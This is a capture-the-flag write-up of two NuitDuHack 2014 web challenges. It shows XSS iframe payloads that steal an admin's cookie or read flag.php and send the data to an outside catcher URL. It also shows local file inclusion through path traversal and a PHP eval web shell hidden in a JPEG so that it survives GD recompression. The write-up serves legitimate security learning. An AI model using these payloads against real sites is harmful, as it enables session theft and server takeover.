+++
author = "pwntester"
categories = ["CTF", "XSS", "Web", "PHP", "LFI"]
date = 2014-04-06T10:29:00Z
description = ""
draft = false
slug = "nuitduhack-2014-web-write-ups"
tags = ["CTF", "XSS", "Web", "PHP", "LFI"]
title = "NuitDuHack 2014 Web Write Ups"

+++


# Web 100: Abitol

This is a simple web app where you can register and login to see an articles page, a photo gallery, a flag page and an admin contact page.

Visiting the flag page give us a `Nice try, did you really think it would be that easy? ;)` but the photo gallery is vulnerable to XSS:

`http://abitbol.nuitduhack.com/zoom.php?image=1%3E%3Cscript%3Ealert%281%29%3C/script%3E`

![](/images/octopress/ndh_1.png)

Now, we dont know how the admin contact will be visualized in the viewer page, but we can try to send him a message with an iframe pointing to the vulnerable page so we can send his session ID to our cookie catcher or use XHR to request the flag.php page and send us the flag. Both options work, but the second is slighlty better since the time frame where the session ID is valid is very narrow:

```lang-bash line-numbers 
<iframe src="http://abitbol.nuitduhack.com/zoom.php?image=1.jpg><script>flag = new XMLHttpRequest(); flag.open('GET','/flag.php',false); flag.send(); flag.open('GET','http://ctf.pwntester.com/catcher.php?data='+flag.response); flag.send();</script>" />
```

```lang-bash line-numbers 
<iframe src="http://abitbol.nuitduhack.com/zoom.php?image=1.jpg><script>document.location="http://ctf.pwntest.com/catcher.php?data="+document.cookie</script>" />
```

After waiting a few minutes, the flag is waiting for us in the catcher:

![](/images/octopress/ndh_2.png)

# Web 300: Titanoreine

This is a photo gallery where we can upload any image to the site. That seems the first attack vector, the second one is that it allows you to change the language and the parameter to do that is `lang=(eng|fr).php` which looks vulnerable to LFI. After some trials, you can include any local file in the root directory by going down three levels. Eg:  `../../../upload.php`

![](/images/octopress/ndh_3.png)

If we include the default images in the gallery system, we can see that only `2.jpg` is included as binary garbage in the page:

![](/images/octopress/ndh_4.png)

However if we download the original image and upload it again with a different name, the new image cannot be included and the LFI just show an empty page. So there seems to be some kind of conversion going on. Comparing the EXIF data of the original and converted ones, we can see that is being compressed by gd library with quality 98:

![](/images/octopress/ndh_5.png)

We will compress it locally so that it does not suffer any conversion in the server (actually the server still changes the image, but probability of screwing up the php code are smaller):

```lang-php line-numbers 
$image = imagecreatefromjpeg('avatar.jpg');
imagejpeg($image,'avatar_lq.jpg',98);
```

Uploading the new compressed image to the site and including it via the LFI works now. All we have to do now is include a PHP shell. It turns out that many PHP commands seems to be forbidden by the server so we ended up using eval: `<?php eval($_GET['a']); ?>`

Update: During the CTF, we were lucky to find another team JPG so that we could slightly modufy it and use it. Modifying a JPG so that the changes survide a GD compression is not an easy task, but will try to explain in a following post.

With that in place we can start sending commands to the server. First we can exfiltrate the code using `highlight_file()`:

`index.php`
![](/images/octopress/ndh_7.png)

`functions.php`
![](/images/octopress/ndh_8.png)

`upload.php`
![](/images/octopress/ndh_9.png)

In order to get the flag, I used a directoryIterator since many other options were cut off:

```lang-php line-numbers 
$it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator('./'));while($it->valid()){echo $it->getSubPathName()."</br>";$it->next();}
```

![](/images/octopress/ndh_10.png)

The flag is hidden in the unsuspicious file:

![](/images/octopress/ndh_11.png)

Voila!

Thanks to **in3pids**, **@_SaxX_** and the organization for such a fun CTF!

